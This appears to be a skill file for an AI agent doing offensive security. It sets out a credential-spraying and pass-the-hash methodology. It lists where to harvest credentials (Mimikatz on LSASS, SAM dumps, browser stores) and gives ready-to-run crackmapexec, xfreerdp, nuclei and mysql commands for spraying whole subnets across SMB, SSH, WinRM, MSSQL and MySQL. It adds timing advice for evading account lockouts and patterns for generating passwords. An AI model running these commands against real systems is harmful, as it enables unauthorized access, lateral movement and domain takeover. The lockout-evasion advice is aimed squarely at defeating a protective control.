---
name: cred-spray
description: "Credential spraying and credential reuse attacks. Use after usernames, passwords, or hashes have been collected and you need to verify whether those credentials are valid on other services or hosts. Covers password spraying strategy (avoiding lockouts), credential reuse detection, and PTH/PTK attacks. Used to expand the scope of control"
zh-signals: "在收集到用户名、密码或哈希后，验证凭据在其他服务与主机上的有效性，覆盖避免锁定的密码喷洒、凭据复用检测与 PTH/PTK 攻击。信号:凭据喷洒,密码复用,密码喷洒,PTH,PTK,横向移动"
when-to-use: >-
  Use when you have collected usernames, passwords, or hashes and need to test whether
  those credentials are valid on other services or hosts, including lockout-safe password
  spraying and pass-the-hash/pass-the-ticket attacks.
metadata:
  tags: "credential,spray,brute,credential-spraying,password spray,credential-reuse,pth,pass the hash,ntlm"
  category: "lateral"
---

# Credential Spraying Attack Methodology

## ⛔ Further Reading (Must Read)

- Credential enumeration and collection methods needed before spraying → [references/pre-cred-enumeration.md](references/pre-cred-enumeration.md)

---

Credential spraying differs from brute forcing — brute forcing tries many passwords against one account, while credential spraying **tries one password against many accounts**. The latter is less likely to trigger account lockout.

## Phase 1: Credential Inventory

### 1.1 Aggregate existing credentials
Use `evidence_list` + `evidence_read` (filtering by credential type) to obtain all collected credentials.

Summary of credential sources:
| Source | Credential type | Collection method |
|------|----------|----------|
| Configuration files | Plaintext passwords | Database connection strings, .env files |
| LSASS memory | NTLM hashes/plaintext | Mimikatz |
| SAM database | NTLM hashes | reg save + secretsdump |
| Browser | Plaintext passwords | Chrome Login Data |
| SSH keys | Private keys | ~/.ssh/id_rsa |
| Command history | Plaintext passwords | .bash_history |
| Kerberos | TGS tickets | Kerberoasting |

### 1.2 Build credential dictionaries
Organize the collected credentials into:
- Username lists
- Password lists (plaintext + common variants such as Password1! → Password2!)
- Hash lists (for PTH)

## Phase 2: Spraying Strategy

### 2.1 Password spraying (lockout avoidance)
**Key principle**: try only one password at a time and wait for the interval before trying the next.

```bash
# Spray SMB with crackmapexec
cme smb 10.0.0.0/24 -u userlist.txt -p 'Password123!' --continue-on-success

# One password against many users (safe)
cme smb DC_IP -u userlist.txt -p 'Summer2024!' --continue-on-success

# When using multiple passwords, set the interval (the usual lockout policy is 5 attempts in 30 minutes)
# Try only one password per round, with a 35 minute interval
```

### 2.2 Pass-the-Hash (PTH)
With an NTLM hash there is no need for the plaintext password:
```bash
# SMB
cme smb 10.0.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:HASH'

# WMI
cme wmi TARGET -u administrator -H HASH

# RDP (Restricted Admin mode)
xfreerdp /v:TARGET /u:administrator /pth:HASH
```

### 2.3 Multi-service spraying
Try the same credentials against different services:
```bash
# SSH
cme ssh 10.0.0.0/24 -u admin -p 'password'

# WinRM
cme winrm 10.0.0.0/24 -u admin -p 'password'

# MSSQL
cme mssql 10.0.0.0/24 -u sa -p 'password'

# MySQL
# MySQL (brute force using a custom nuclei template)
echo 'root' | nuclei -u mysql://10.0.0.1:3306 -t ~/nuclei-templates/brute/ 2>/dev/null || \
  mysql -h 10.0.0.1 -u root -p'password' -e "SELECT 1"
```

## Phase 3: Result Analysis

Save successful credentials with `evidence_save`, then evaluate:
- **Local administrator** → usable for lateral movement to that host
- **Domain user** → usable to access in-domain resources
- **Domain Admin** → game over, you control the entire domain
- **Service accounts** → may have special privileges (database/backup, etc.)

## Phase 4: Password Pattern Analysis

Look for patterns in the passwords already obtained:
- Company name + year: `Company2024!`
- Season + year: `Summer2024!`, `Winter2024`
- Keyboard patterns: `Qwer1234!`, `P@ssw0rd`
- Username variants: `john` → `John123!`

Use the discovered patterns to generate more candidate passwords for spraying.

## Notes
- Understand the target's account lockout policy (`net accounts /domain`)
- Typical policy: lockout after 5 failures for 30 minutes → try at most 4 times every 35 minutes
- Prioritize spraying high-value targets (domain controllers/databases/backup servers)
- PTH does not trigger account lockout (it does not go through password validation)

## Lockout Policy Awareness
- Keep the number of attempts below 4 (under the 5-attempt threshold) so no account lockout is triggered
